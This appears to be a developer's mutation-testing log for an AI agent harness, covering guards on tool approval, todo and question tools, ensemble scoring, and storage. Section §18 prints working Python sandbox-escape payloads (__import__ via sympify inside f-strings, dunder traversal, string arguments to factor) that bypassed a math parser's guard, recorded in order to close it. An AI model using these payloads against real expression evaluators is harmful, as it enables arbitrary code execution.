| Drop the bundle's channel from `_authorization_kwargs` | `test_review.py`, `test_research_authorization.py` | §20's reviewer inherits the run's channel |
| `a or kwargs.pop(...)` for the channel merge | `test_passing_both_does_not_raise` | Short-circuits, so the key survives on the path where an explicit channel was passed — "got multiple values for keyword argument" |
| Remove `walk_consent`'s `consent is None` branch | `test_findings_are_recorded_but_nothing_is_applied` | NOTE: V6's OUTCOME now holds without it, because `ask(None, …)` declines. What the guard uniquely provides is the audit trail — a `reason_declined` and a trace line, rather than a rejection indistinguishable from a human's |
| Drop `request_kind="subagent_signoff"` from the registration | `TestTheSignoffIsActuallyWired` | NOTE: the memo test PATCHES `request_kind`, so it cannot see this |
| Empty `request_payload`'s candidate list | `TestTheSignoffIsActuallyWired` | Same — patched away by the memo test |
| Drop `signoff` from dispatch's injection map | `test_dispatch_injects_the_subset_into_the_handler` | Every other sign-off test calls `subagent_tool.run()` directly |
| Grant `candidate_approvals` wholesale again | `test_spawn_forwards_the_channel_and_the_grant` | The pre-§23 behaviour AC1b exists to end |
| Treat a `None` sign-off as approval | `test_refusing_a_spawn_stops_it_happening` | Refusing the spawn and spawning with nothing granted are different outcomes |
| Key the sign-off memo by tool name only | `test_s1_signoff_is_remembered_per_agent_not_per_tool_name` | J8: one prompt about agent `a` must not cover agent `b` |
| `SubagentSignoffScreen`'s escape dismissing `set()` | `TestTheSignoffScreen` | Escape refuses; it does not run with nothing granted |

## §23 slice 2 — the question tool and the todo list

`tests/test_question_tool.py`, `tests/test_todo.py`, and the `TestQuestion`
class in `tests/test_interaction.py`.

| Change | Symptom | Fix |
|---|---|---|
| Return the answered options without intersecting them against `payload["options"]` | `TestQuestion::test_an_unoffered_option_is_dropped`, `test_nothing_offered_means_no_options_come_back` | J3's rule, third instance. A shell returning something nobody proposed is answering a different question. The options live on the request precisely so `decode` can check them |
| Decode a `defer` answer as `None`, or drop the `defer` key from the decoded dict | `TestQuestion::test_defer_is_a_real_answer` / `test_defer_ignores_anything_alongside_it`, plus `test_question_tool.py`'s deferral and CLI tests | A deferral is a REAL answer — the user engaged and chose to discuss. A dismissal is not. Collapsing them makes the modal's "Discuss instead" button pointless, and it is `SUBAGENT_SIGNOFF`'s middle-answer trap one kind along |
| Let `ask_user` proceed when `response_channel is None` | `TestHeadlessDeniesAndSaysWhy` (3 tests) | AC2. With nobody to ask, the call is denied and the error tells the model to decide and state its assumption. §25's V6 one section along: the inability to ask is not permission to proceed |
| Gate `ask_user` (`ToolApprovals.ask_user = True`) | `test_the_tool_is_still_ADVERTISED_with_no_channel`, `test_it_is_ungated_and_allowed` | J12. §13 does not merely deny a gated tool where nothing can ask — it stops ADVERTISING it, so a gated `ask_user` is invisible rather than deniable and the model cannot "work around" anything |
| Truncate `options` to `MAX_OPTIONS` instead of refusing | `TestTheOptionCap::test_five_options_are_REFUSED_not_truncated`, `test_the_cap_error_names_the_limit_and_the_count` | Truncating shows the user a different question from the one the model asked, and the model then reads the answer as a response to the whole list. M15's rule with the model in the naming role |
| Drop the `QUESTION` branch from `main.py`'s `ask` or `tui/app.py`'s `_ask_blocking` | `TestTheCliRenderer` (8 tests) / `TestTheTuiModal` (5 tests) | D12. A kind a shell does not render falls through to `None` and decodes as "nobody answered" on every run in that shell, while looking wired up |
| Have `todo_write` write `memory.extra["todos"] = …` instead of `memory.set_extra(...)` | `test_it_persists_through_set_extra_not_by_mutating_extra` | `extra` is a COPY (`core/memory.py`), so mutating it changes nothing and reports success. The symptom is invisible until the next turn |
| Truncate an over-cap todo list, or coerce an unknown status to `pending` | `test_over_the_cap_is_REFUSED_not_truncated`, `test_an_unknown_status_is_REFUSED_not_coerced` | Both leave the model believing it recorded something it did not. `MAX_INJECTED_REFS`' refuse-rather-than-drop rule |
| Stop `_run()` yielding a tool result's `notice` as a `LoopEvent` | `TestTheLoopForwardsAndStripsIt::test_a_notice_on_a_tool_result_becomes_a_loop_event` | AC4's event route (J10). Note the PANEL tests still pass — they post the message directly — so this mutation is caught by the loop test alone, which is why both exist |
| Leave the `notice` in the result instead of popping it | `test_the_notice_is_STRIPPED_from_what_the_model_sees`, `test_a_malformed_notice_is_dropped_not_raised` | A notice is plumbing for the shell. Leaving it in sends the panel's trigger to the model as part of the tool's answer |
| Recognise `todo_write` by name in `core/loop.py` instead of forwarding any result `notice` | Nothing goes red — and that is the point of the generic route | `ToolSpec.grant_scope` and `request_kind` exist so no tool name appears in the loop. `TestTheLoopForwardsAndStripsIt` drives a fake `probe` tool precisely so the mechanism is tested without the tool that motivated it |
| Move `with_todos` inside `with_catalogs()`, or add the fragment to `pass_prompt()` | `TestThePromptTier::test_it_is_NOT_inside_with_catalogs` | §19's K6, FOURTH instance after §21b's M13 and §21c's M19. A checklist written in a chat session would land in all ten passes of a separate research run. The test asserts against three REAL pass prompts, so a leak added one call deeper still fails |
| Remove `ask_user` or `todo_write` from either `config` dataclass | `RuntimeError` at import of `tools.registry`, naming the tool | D24. Verified by deleting `ToolPermissions.todo_write` |
| Make `tui.todo_position` fall back on an unknown value instead of raising | `TestTodoPosition::test_an_unknown_position_raises_and_names_the_vocabulary` | `research.approval_mode`'s precedent, not `tui.theme`'s: the vocabulary lives in `config_loader`, and a position the renderer does not understand puts the panel somewhere the user did not ask for. `tui.effort` had neither check and that was a shipped bug |
| Drop `TodoPanel.__init__`'s `self.display = False` | `TestThePanelWidget::test_it_starts_hidden` | A Textual `reactive`'s watch method does not fire for its initial value, so the panel is a visible empty box until something first sets `todos` — which on a fresh thread may be never |
| Set `display = True` once (ResearchProgress's shape) instead of toggling it | `test_clearing_HIDES_IT_AGAIN` | A todo list empties as well as fills, so the reveal has to be reversible |
| Write a transcript line for a `todo_changed` notice | `test_a_todo_notice_writes_NO_transcript_line` | The list changes several times in a turn; in an append-only transcript that is a column of near-identical lines. §26 made the same call for `pass_activity`. The neighbouring test asserts other notice kinds STILL write theirs, which §21a's "no silent compaction, ever" depends on |

---

## §10 revisit — the ensemble redesign (`test_ensemble_guard.py`, `test_orchestrator.py`, `test_confidence_scoring.py`)

`test_ensemble_guard.py` was rewritten wholesale (3 → 15 tests). It used to guard
§16's refusal of ensemble mode on a model that rejects sampling parameters;
diversity now comes from a roster of different models, so no sampling parameter
is involved and no model is excluded. **The reason the guard exists carried over
even though the mechanism did not** — refusing beats running degraded, because a
degraded ensemble run does not fail, it reports false confidence expensively.

Two constants were **deleted**: `config.ENSEMBLE_TEMPERATURE` (the defect) and
`config.ENSEMBLE_N` (N is `len(config.ENSEMBLE_MODELS)` now). The
`settings.json` key `ensemble_n` and the `ensemble_n` pipeline parameter both
**survive** — removing the key would make every existing `settings.json` that
sets it raise, since unknown keys raise by design.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Count roster entries instead of **distinct** `(provider, model)` pairs | `test_one_distinct_model_repeated_is_refused` | The distinctness is the guard. `[X, X, X]` recreates §10's original defect through the new config: no sampling variation remains to make the candidates differ, so they arrive near-identical and every claim scores maximal consistency |
| Add `ensemble_models` to `_KNOWN_SETTINGS` (or drop the named rejection) | `TestSettingsRejectsARoster::test_ensemble_models_is_rejected_by_name` | R12's rule, second instance. The mode is a bool that can only spend more of the provider the user already chose; a **roster chooses providers**, and a project's `settings.json` beats the user's. Rejected by name so the omission does not read as an oversight to fix |
| Run every Pass 1 candidate on the run's own `model`/`provider_name` | `test_each_candidate_runs_on_its_own_provider_and_model`, plus two others | That *is* the mechanism. Note the plain `call_log` cannot catch this — it records only pass ids, so three runs of one model look identical to a three-model ensemble. Use `_routing_mock`, which records `(pass_id, provider_name, model)` |
| Let a candidate's exception propagate instead of skipping | `test_a_failed_candidate_is_named_traced_and_skipped` and three others | §20's containment rule. One unreachable provider must not flip a ten-pass run to `failed` |
| Drop the cause from the skip trace line | Same test, on the `"connection refused"` assertion | "A candidate failed" with no cause is not something a user can act on |
| Label candidates by roster position rather than survivor order | `test_candidate_labels_follow_survivors_not_roster_positions` | A gap ("Candidate 1, Candidate 3") makes Pass 2 tag a claim both survivors asserted as `[1, 3]` against a denominator of 2, so unanimous claims read as dissented-against. Silently deflated confidence is the failure class this section removes |
| Score a single survivor as an ensemble of one (`effective_n >= 1`) | `test_one_surviving_candidate_scores_without_a_penalty` | One candidate cannot disagree with itself, so every claim would score consistency 1.0 and report unanimous corroboration from a single source. `ensemble_n=0` is the **correct** formula there, not a degraded one |
| Honour a passed `ensemble_n` over `len(ENSEMBLE_MODELS)` | `test_ensemble_n_is_ignored_in_favour_of_the_roster` | A confidence score's denominator must not be able to disagree with the roster that produced the candidates |
| Make the disagreement penalty `W * consistency` instead of `W * (1 - consistency)` | `test_ensemble_factual_uses_ensemble_formula`, `test_ensemble_dissent_subtracts_and_grounding_is_not_diluted` | Unanimity must be free. A claim is not penalised for having been generated by an ensemble |
| Restore `0.4/0.3` weighting for ensemble runs | The two above plus `test_partial_grounding_factual_lands_medium` and `test_non_ensemble_regression_identical_output` | Grounding is the pipeline's strongest evidence; which generation strategy produced a claim is no reason to weigh its verification differently |
| Subtract the disagreement penalty in the **non-factual** arm | `test_ensemble_non_factual_ignores_consistency` | E9. **This mutation ran GREEN before that test was fixed**: it asserted with `asserted_by_candidates=[1,2,3]` against `ensemble_n=3`, so the penalty it excluded was zero for that input. It now sweeps 3/3, 1/3 and 0/3 — assert the premise, or the conclusion means nothing |
| Compare the unrounded score against `TIER_THRESHOLDS` (i.e. revert E10) | `test_a_recorded_score_on_a_threshold_gets_that_threshold_s_tier` and `test_the_tier_reads_the_same_number_the_breakdown_stores`, the latter reporting the original symptom verbatim | Round once, use it for both. Note the swept test also covers ensemble inputs, so it catches this regardless of which formula produced the score |
| Delete `_sampling_kwargs`, `MODELS_REJECTING_SAMPLING_PARAMS` or `temperature`'s threading as dead code | Nothing fails immediately — which is the hazard | They are a **backstop** now: nothing in the harness passes a temperature, and the WARNING is how the next caller that wants sampling variation learns it cannot have it. Silence here is exactly how §10's defect stayed invisible |

### Standing: the doc-count guard fires on every added test

`test_docs_consistency.py::test_the_documented_count_is_the_real_one` compares
the collected total against the number quoted in `README.md`, `AGENTS.md` and
`ARCHITECTURE.md`. It **skips** on a narrowed invocation, so a green
`pytest tests/test_ensemble_guard.py` says nothing about it. Run the full suite
before committing, and update all three quotes together.

---

## §16 — the first fix batch from Audit Pass 1 (2026-08-15)

Nine audit findings, all closed by adding tests rather than changing production code. Every
row below was a mutation that left **all 1406 tests green** before this batch; each is now
pinned by the named test. If you are reverting one of these tests, the mutation in its row is
what stops being caught.

**These tests were each driven against their own mutation before landing.** That is the
standard the batch was held to, and two of them failed it on the first attempt — see the two
"standing" notes at the end, which are the more useful half of this section.

### New files

| File | Tests | What it pins |
|---|---|---|
| `test_fake_storage_mirror.py` | 16 | `FakeStorage._reconstruct` / `_split_at` against `storage._to_neutral` / `storage._split_at` (#123) |
| `test_prompt_tier_boundary.py` | 11 | K6 as a rule: a pass prompt is invariant under every session tier (#146) |
| `test_sdk_conformance.py` | 4 | the real pinned SDKs, offline — google-genai fields, the thinking_budget pin note, httpx's redirect default, and #35 as a strict xfail (#143) |
| `test_fetch_url.py` | 18 | `fetch_url`'s whole surface, which no test had ever executed (#120, #58) |

### What breaks them

| Change | Symptom | Why the guard exists |
|---|---|---|
| Change `storage._to_neutral`'s reconstruction without changing `FakeStorage._reconstruct` identically (or vice versa) | `test_fake_storage_mirror.py::TestReconstructionMirrorsProduction` fails, naming the role that diverged | AGENTS.md's "verify against production, not the test double" was a convention nothing checked. Both are pure functions, so the check is direct |
| Make `_split_at` return `len(rows)` for a watermark it cannot find, on **either** side | `test_an_unknown_watermark_is_zero_on_both_sides` | The 0 is what shows the whole thread rather than hiding a prefix on the strength of an id that could not be resolved |
| `return Claim(**raw)` in `_claim_from_json` | 8 tests in `test_orchestrator.py`, including the end-to-end path — the canned Pass 2 payload carries a `confidence` key for exactly this | Nothing outside the allowlist appeared in any canned payload, so the filter was never exercised |
| Widen or narrow `_CLAIM_INPUT_FIELDS` | `test_every_allowlisted_field_still_arrives`'s exact-contents assertion | The previous worked example (`asserted_by_candidates`) was moved INTO the allowlist by §10's revisit, so two documents described filtering with a field that was no longer filtered |
| Remove `dirs.sort()` from `_content_hash` | `test_descent_order_does_not_change_the_digest` | An unchanged `.venastine/` hashing differently re-prompts for trust already granted, and repeated unexplained trust prompts are what train someone to approve without reading |
| Remove `dirs.sort()` from `content_files` | `test_descent_order_does_not_change_the_trust_prompt_listing` + `test_content_files_sorted_and_relative` | Same one-line guard at the site that produces the text a user reads to decide whether to trust a project |
| Append any tier inside `prompts.system_prompts.with_catalogs()` | `test_no_tier_canary_reaches_any_pass_prompt[<tier>]` names the tier; `test_with_catalogs_itself_carries_no_session_tier` names the function | K6/M13/M19/J11 each pinned ONE tier. Appending the project's `CONTEXT.md` inside reached all ten research passes with 1406 green |
| Replace `list_threads`' SQL `WHERE` with a Python filter | `test_list_threads_filters_by_kind_in_sql` — it now reads the statements the driver executes, not the set returned | The returned set is identical either way, so the test was named for a mechanism it could not observe |
| Delete `self._cancel_manager()` from `connect_all`'s except block | `test_connect_timeout_cancels_the_manager_task` — via `_done`, which the except block does not touch | `_task is None` and `clients == {}` are set by the other two statements; they record the release, they do not cause it |
| Remove `fetch_url`'s scheme check or its `is_domain_blocked` call | 7 and 1 tests in `test_fetch_url.py`, each asserting the request never left the process | Both are live and ungated: advertised in plain chat and in all ten research passes |
| Drop the `+ os.sep` from `_is_within_workspace` | `TestSiblingDirectoryPrefix` | `/workspace-evil` is judged inside `/workspace`, turning a PROMPT into an auto-approval. Dormant behind the global deny, which is why it needs a test |
| Narrow `_is_readable_doc`'s `.env` prefix test to `==`, or its any-segment check to `parts[0]` | `test_read_refuses_env_files_with_a_suffix` / `test_read_refuses_a_denied_segment_at_any_depth` | The pre-existing tests used `.env` exactly and put `.venastine` first, so both narrowings kept them green |
| Fix #35 or #53 | The strict `xfail` for each turns into `[XPASS(strict)] … FAILED` | Deliberate. A strict xfail tells whoever fixes the bug to delete the marker, instead of leaving a green xpass nobody reads |

### Standing: a test that fails for the wrong reason is indistinguishable from one that works

Two of this batch's tests passed their first driving for reasons unrelated to what they were
named for. Both were found only by asking *why* the result looked right.

- **`test_sdk_conformance.py`'s #35 arm** reported `xfail` because real `anthropic` does
  `from httpx import URL, Proxy, Timeout, …` at import time, and `real_package("anthropic")`
  left the fake `httpx` in place — so it died with `ImportError` before reaching
  `ModelCapabilities`. **Reaching a real package past a fake means unfaking its dependencies
  too.** Fixed by `real_package("anthropic", "httpx")`.
- **`test_workspace_trust.py`'s first descent-order test** compared a "reversed" walk against
  the real one — and this filesystem enumerates `.venastine/` as `skills, agents`, which is
  already reverse-alphabetical. Two identical orders, compared. **When a test's input is
  "whatever the environment happens to do", control BOTH sides.** Both walks are now
  synthetic, and `test_the_two_walk_doubles_really_do_differ` asserts they differ.

The general form, which `test_pilot_wait.py` already carries for the pilot helpers: when a
test's whole job is to fail on a specific defect, the defect has to be applied and the failure
read — and the *reason* for the failure checked, not just its presence.

### Standing: "collect problems, assert none" passes loudest when it sees nothing

`test_sdk_conformance.py` has two checks of that shape, and both now assert they can see their
subject first — the AST walk found ≥6 classes and ≥10 keywords; `ThinkingConfig` exposes some
`model_fields` at all. An empty collection satisfies "no problems" and an absent field
satisfies `not in`, so either would have gone quietly vacuous at exactly the moment the thing
it inspects stopped being readable.

### Standing: the fake `httpx` now carries state

It gained `_queued` and `_requests` for #120, driven through `tests/conftest.py`'s `http`
fixture, which clears both before and after every test. Reaching into `httpx._queued` directly
from a test leaks a queued response into the next one. The default answer with an empty queue
is unchanged (`_Response(text="", url=url)`), so every pre-existing caller is unaffected.

---

## §17 — the second fix batch from Audit Pass 1 (2026-08-15)

The first batch added tests only. **This one changes production code** — three files, closing
two S0s and two S1s. Every fix was driven against its own mutation before being called done;
the mutation driver is recorded per row below.

| Change | Issues | Files |
|---|---|---|
| Persist the tool-result row before emitting its event | #42 | `core/loop.py` |
| Drop empty assistant turns above the provider branch split | #13, #36 | `core/client.py` |
| Treat a symlinked project tier root as absent | #18 | `core/config_loader.py` |

Suite 1468 → **1488**.

### What breaks these

| If production code changes like this… | …this fails | Why it matters |
|---|---|---|
| Move `memory.add_tool_result()` back after the `yield` | `test_an_abandoned_generator_still_persisted_the_tool_result` + `test_the_assistant_tool_use_was_persisted_too` | D20 already wrote the `tool_use`; the orphaned pair is an unresumable thread, and the failure surfaces on a later resume as a provider error naming none of this |
| Move `tool_call_start` after its dispatch | `test_the_tool_call_start_event_still_precedes_the_dispatch` | The *correct* ordering, pinned so #42's fix is not over-applied. There is nothing to persist at that point |
| Delete the `_is_empty_assistant_turn` pre-filter | 6 tests, including `test_messages_google_empty_assistant_turn_skipped`, which predates the fix | Google's local guard is gone, so the pre-existing test now holds the shared rule — that is the point of moving it |
| Key `_is_empty_assistant_turn` on empty text alone | 6 tests, including the pre-existing `test_messages_openai_assistant_with_null_text` and two Google tool-result tests | A tool-call-only turn has no text. Dropping it takes the `tool_use` with it and orphans the `tool_result` — #42's defect, reached from the translation side |
| Re-add a local empty-turn guard to any one branch | Nothing, and that is the hazard | Two rules that can disagree is the state #13/#36 were filed from. `test_no_provider_emits_a_message_for_an_empty_assistant_turn` is parametrised over all three so a fourth branch inherits the property |
| Drop `os.path.islink` from `_tier_dirs`' project entry | 3 tests in `test_config_loader.py` + `test_the_loader_reads_no_file_the_trust_listing_omits` | Project content loads unhashed, unlisted, and mutable after one grant — and the payload is system-prompt instructions |
| Apply that symlink check to the harness or user tier too | `test_a_symlinked_user_tier_root_still_loads` | Nothing hashes those directories, so it is not a trust question; symlinking `~/.config/venastine/` into a dotfiles repo is legitimate |
| Make `os.walk` follow links in `workspace_trust` | `test_a_symlinked_tier_root_is_invisible_to_both_the_hash_and_the_listing` | Not a regression — a prompt. That test pins the *current* asymmetry, so following links becomes a deliberate change made with the cycle and realpath guards it needs, and #18's loader guard can then be reconsidered |

### Standing: an invariant of the form `A ⊆ B` decays into a tautology

`test_the_loader_reads_no_file_the_trust_listing_omits` asserts `read <= listed`, which is
trivially true when `read` is empty — so it would pass loudest if `_md_files` stopped finding
anything at all. `test_that_invariant_can_actually_fail` is the mutation run as a test: it
rebuilds the pre-#18 unguarded path, asserts it finds something, and asserts that something
escapes the listing. Delete it and the invariant above still passes forever.

This is the same failure mode as the previous batch's "collect problems, assert none", and the
third shape of it recorded here. Subset, emptiness and non-membership assertions are all
satisfied by an absent subject.

### Standing: the producer-side fix is what closes the class

#13 was filed against the OpenAI branch and was live — it killed a real Pass 2. Applying its
suggested fix exactly as written would have left **the default provider** dying differently
(#36), and Google correct only by accident of which provider was under debug when the hazard
was first met. One filter above the split fixed all three and pre-fixes the fourth. That is
AGENTS.md's *fix at the producer, not the consumer* rule meeting a case where the consumers
were three provider branches rather than two call sites.

---

## §18 — #52, the S0 in the math tools (2026-08-15)

`safe_parse`'s stated guarantee — "`__builtins__` blanked, injection-tested" — was false in both
halves, and arbitrary code executed through the real `registry.dispatch` on six tools that are
advertised and ungated in every research pass. Replaced with an **allowlist at the token
boundary**: `_reject_unsafe_names`, first in `_TRANSFORMATIONS`.

Suite 1488 → **1576**. The single injection test became 26 payloads, a 37-case legitimacy
battery, and four closure tests.

### The token filter was wrong, and the bypass is the point

The first version of this fix rejected dunder and non-allowlisted NAME **tokens**. It was
bypassed within the hour of shipping:

```
f"{sympify('__import__(chr(111)+chr(115)).getpid()')}"   ->  the pid, and base64 imported
"{0.__class__.__bases__}".format(pi)                     ->  dunder attributes
sin(pi).func.mro()                                       ->  classes, no underscore anywhere
```

On Python 3.11 an f-string is a **single `STRING` token** (PEP 701 split it into `FSTRING_*`
tokens only in 3.12), so a NAME filter cannot see inside one — while the code within evaluates
with `_SAFE_GLOBALS` in scope, `sympify` included. **A token stream is not the language**, and
which constructs the tokenizer hides is a property of the Python version, not of this code.

The guard is now `_validate_ast`: `parse_expr` split into `stringify_expr` → *check* →
`eval_expr`, validating the AST of exactly the string that will be evaluated against a closed
allowlist of 39 node types out of Python's 118.

### What breaks it

| If production code changes like this… | …this fails | Why it matters |
|---|---|---|
| Add `ast.Attribute` to `_ALLOWED_NODES` | `test_the_dangerous_node_types_are_refused[Attribute]` + 6 payloads | Attribute traversal IS mechanism 2, and is also how `str.format`, `.mro()` and every bound-method route is reached |
| Add `ast.JoinedStr` / `FormattedValue` | same test, + 4 payloads | The bypass that killed the token filter |
| Add `Lambda`, a comprehension, `Starred`, `Dict`, `Set`, `NamedExpr` | same test, parametrised per node | Each is a construct that would have to be argued harmless instead of refused |
| Widen `_ALLOWED_NODES` generally | `test_the_node_allowlist_is_closed_and_small` | Closure is the property. Coverage is not |
| Allowlist any evaluating name | `test_no_permitted_name_can_evaluate_a_string` | Mechanism 1 |
| Allowlist a module name | `test_no_module_object_is_permitted` | It caught `evalf`, which is a **module** in `_SAFE_GLOBALS`, not the method — allowlisted by mistake |
| Go back to `parse_expr()` | 30+ payloads | The check only exists because the two halves are called separately |
| Narrow `_ALLOWED_NAMES` to nothing | 34 legitimacy tests | **Every attack test still passes.** The legitimacy battery is the only thing that sees this |

That last row is why the legitimacy battery exists, and it is #47's lesson applied: an allowlist
needs a test asserting that real producers satisfy it.

### Mechanism 4: a string literal reaching a function that sympifies it

Found by **auditing the allowlist's own source** for calls to `eval`/`exec`/`sympify`, not by
guessing at payloads. Seven permitted names do it — `factor`, `cancel`, `together`, `apart`,
`roots`, `degree`, `nsolve` — and a string literal handed to any of them re-enters the parser
with SymPy's default globals, real builtins included:

```
factor(" __import__(chr(111)+chr(115)).getpid() ")   ->  the pid
```

The leading space is the whole trick: the guard's dunder tripwire matched *prefix and suffix*,
so one space walked past it. Prefix-matching a payload is the same category of mistake as
`chr(111)+chr(115)` defeating a search for the literal `"os"`.

`stringify_expr` gives a string argument to exactly two calls — `Symbol('x')` and
`Float('1.5')` — so `_STRING_ARG_CONSTRUCTORS` licenses those two positions and every other
string literal is refused. **This closes the class without knowing which functions sympify**,
which is the difference between a closure and a filter. Adding a name to
`_STRING_ARG_CONSTRUCTORS` means arguing that the constructor does not sympify what it is
handed.

### Standing: assert the GUARD refused, not that something raised

An earlier version of the battery asserted `pytest.raises(MathParseError)`. Under a
guard-runs-last mutation **all 68 tests stayed green** — `external.gmpy.os` dies with an
`AttributeError` anyway, `split_symbols` having already shredded `external` into
`e*x*t*e*r*n*a*l`. The payload was refused; the guard was not what refused it. The battery now
asserts the guard's own message.

Third time this session that the "fails for the wrong reason" rule has caught something, and the
first time it caught something in a test written *after* the rule was recorded.

### The output backstop, and why it is a deny rather than an allowlist

`_reject_escaped_value` is the only check on what `safe_parse` RETURNS. It refuses a module, a
plain function or method, or a class from outside SymPy, recursing through returned containers
(`solve` returns a list, `roots` a dict, so an escaped object can arrive nested).

It is deliberately a **deny of the escape signature**, not an allowlist of return types: its job
is to catch an escape nobody anticipated, and an allowlist can only catch escapes whose shape was
already imagined — which four of this issue's five mechanisms were not.

| If production code changes like this… | …this fails |
|---|---|
| Drop the `_reject_escaped_value(result)` call | `test_the_backstop_is_actually_wired_into_safe_parse` |
| Let modules through | `test_the_backstop_refuses_a_module` |
| Let any class through | `test_the_backstop_refuses_a_non_sympy_class` |
| Stop recursing into containers | `test_the_backstop_looks_inside_containers` |
| Widen `_STRING_ARG_CONSTRUCTORS` | 11 payload tests |
| Drop the string rule | 10 payload tests |

`test_the_backstop_allows_every_legitimate_return_shape` is the discriminator: a backstop that
refuses everything passes all four of the negative tests above.

### 117 of 213: the allowlist is not "just maths"

The source audit that found mechanism 4 could read **15** of the 229 resolvable allowlisted
names; the other 214 are C extensions. The blackbox probe covers all of them, and the answer is
**117 evaluate a string handed to them** — not 7.

That number is the argument for the string rule being load-bearing rather than defence in depth.
`Symbol` and `Float`, the two licensed positions, are not among the 117, and
`test_the_licensed_string_constructors_do_not_evaluate_their_argument` is the obligation the
licensing decision rests on. `test_the_probe_can_detect_an_evaluator` guards it, because that
test asserts a negative and would pass perfectly if the probe stopped working.

### Not claimed

The battery covers the two filed mechanisms and 14 payloads, and the allowlist fails closed. It
is **not** a proof that no escape exists: the 231 permitted callables were not individually
audited for evaluation behaviour. #57 (no wall-clock bound on math tools) is untouched and
remains open — a token filter bounds what can be *named*, not how long it runs.

---

## §19 — the third fix batch from Audit Pass 1 (2026-08-17)

The S0 tier is clear, so this batch takes the two **S1**s that were ready to build: both carried
a fix already applied as a mutation and verified green, and neither needed a design decision
first. The three remaining S1s do — #57 (parameter bounds vs a watchdog at `dispatch`), #76 (a
shape-validation layer across eight passes), #100 (a control that could not be made green,
because the chat tests supply their lines by patching `builtins.input`).

| Change | Issue | Files |
|---|---|---|
| Count the retry ROUND, not the revision; scope the in-loop re-tiering to the batch | #74 | `core/reasoning/orchestrator.py`, `core/reasoning/confidence_scoring.py` |
| Make the pinned span whole — a pinned `tool_use` brings back the row that answers it | #88 | `storage.py`, `tests/conftest.py` |

Suite 1576 → **1605**. (The intervening count was 1597; three documents quote it, and
`test_docs_consistency` is what makes that mechanical.)

### #74 — the loop's only bound was data the model supplies

`retry_count` was incremented only inside the loop over Pass 6a's response, so a flagged claim
6a did not **name** could never reach D2's cap — and `while flagged:` had no other bound. 6a is
one batched call across every flagged claim, which is exactly the shape a model drops an item
from, and an omission, an empty list and an unknown id are indistinguishable at that lookup:
the claim resolves to `None` and the `if claim:` skips in silence.

Counting the round makes the cap bound the loop by construction. Because `flagged` only ever
shrinks, every claim still in it exhausts on the same round — which is also what makes the
issue's second defect unreachable through the loop.

| If production code changes like this… | …this fails | Why it matters |
|---|---|---|
| Move the increment back inside `for rev in revisions:` | `test_a_claim_pass_6a_omits_still_exhausts_its_retries` + `test_a_pass_6a_response_naming_nothing_still_exhausts_the_loop` | The bound becomes the model's cooperation again: two model calls per round, each on `RESEARCH_PASS_TOKEN_BUDGET`, with no ceiling but a rate limit |
| **Add** the per-round increment while leaving the per-revision one | `test_pipeline_6a6c_retry_loop_continues_until_max_retries_then_fallback` | A named claim then counts twice and exhausts in half the rounds. This is the issue's own withdrawn control — its red was the mutation's arithmetic, not the fix's cost |
| Drop `claims=flagged` from the in-loop `run_confidence_tiering` | `test_a_retry_round_does_not_re_tier_a_claim_outside_its_batch` | A claim finished at D1 or D2 is recomputed from unchanged score data while the annotation `_apply_fallback` wrote stays — so it ships as (say) LOW beside a note saying it could not be verified. Pass 6b leaves both alone, because `if claim.annotation is None` is false |
| Resolve 6a's revisions with `run.claim_by_id` instead of within `flagged` | Nothing today | A revision naming a claim outside the batch lands on one already finished, carrying a `retry_count` this round did not increment — so the `retry` event reports a stale attempt. Recorded rather than pinned: no canned payload produces it, and validating that a pass answered about what it was asked is #76 |

**The three new tests are bounded by the mock, deliberately.** With the fix reverted the loop
does not fail, it never terminates — so each payload supplies exactly `MAX_PIPELINE_RETRIES`
rounds and `_build_pass_mock` raises when the loop asks for one more. The pipeline's `except`
re-raises, so the red arrives as a failure rather than as a hung suite. The tracker's rule: a
probe that would hang is worth writing, one that hangs is not.

### #88 — the derived view has two span boundaries and only one is turn-aligned

M4 is stated over the checkpoint watermark. The **pinned set** is the other boundary, and it can
never be turn-aligned: `pin` is dispatched from inside a turn, D20 has already persisted the
assistant message carrying the `tool_use` for `pin` itself, and the answering `tool` row is
written after dispatch returns — so it is never pinned. While the pin is in the uncompacted tail
this is invisible. The first compaction whose watermark passes the pinned region puts an
unanswered `tool_use` in the view: an HTTP 400 on Anthropic, durable (the checkpoint is a
persisted row, there is no unpin, and nothing removes a checkpoint), and misattributed — the
user sees a provider error with no visible connection to a `pin` several turns earlier.

| If production code changes like this… | …this fails | Why it matters |
|---|---|---|
| Revert `storage.pinned_through` to returning the pinned rows alone | `test_a_pinned_tool_call_brings_back_the_result_that_answers_it` + `test_a_pinned_pin_call_leaves_no_unanswered_tool_use_in_the_view` | The thread becomes permanently unsendable, and every later call and every resume rebuilds the same view |
| Revert **only** `FakeStorage.pinned_through` | `test_a_pinned_tool_call_comes_back_with_the_result_that_answers_it` | #123's shape, closed rather than repeated: the fake's mirror is now load-bearing, not merely documented as one |
| Re-add every unpinned tool row in the span rather than the needed ones | that test + the two pre-existing M9 tests | Puts back the results compaction just summarized, which is the context the feature exists to shrink |
| Fix it in `_derived_view` or in `pin_last` instead | Nothing — a design note | Consumer-side is this project's canonical bug shape and would hide from the model a call it made; stopping `pin_last` at the last complete turn changes what "pin the last N turns" means and leaves any other non-turn-aligned pinned set open |

**The end-to-end test needs a REAL compaction**, which is why it is in `test_storage_e2e.py`:
the two boundaries coincide until a checkpoint exists. Same reason that file had to exist for
M11. It asserts its preconditions beside the claim — that a fold happened, that the watermark
passed the pinned turn, and that the pinned assistant row is in the view — because without the
last one the real assertion holds vacuously.

### Standing: three backstops in `pinned_through` survive, and the code now says so

`have`, the `set()` dedupe and the `role == "tool"` filter were each deleted separately against
the full suite and **each survived**. What actually keeps the result duplicate-free is the
`not m["pinned"]` filter — a pinned tool row is already in `keep` and cannot be re-added — and
reaching any of the three needs two rows sharing one `tool_call_id`, or a non-tool row carrying
one. Neither has a producer: `add_tool_result` writes exactly one row per call, and
`add_user_message` passes no `tool_call_id`.

Kept rather than trimmed, because what they guard is a *duplicate* `tool_result` — the same wire
error from the other direction as the one the function exists to prevent, which is the wrong
place to trade a free backstop for a reachability argument. The measurement is recorded in the
code so no later reader has to re-derive it, which is the difference between this and the
comments unit 10 and unit 12 had to re-measure.

Two of the new tests were then named for what they discriminate rather than for the guard they
appear to sit on: `test_an_already_pinned_tool_result_is_not_added_twice` stays green with
`have` deleted. That is #61's shape — a test observing an effect adjacent to its cause — caught
before filing rather than after.

### Why the M9 test could not see this

`test_a_pinned_row_inside_the_covered_span_comes_back_verbatim` pins `rows[1]`, an assistant row
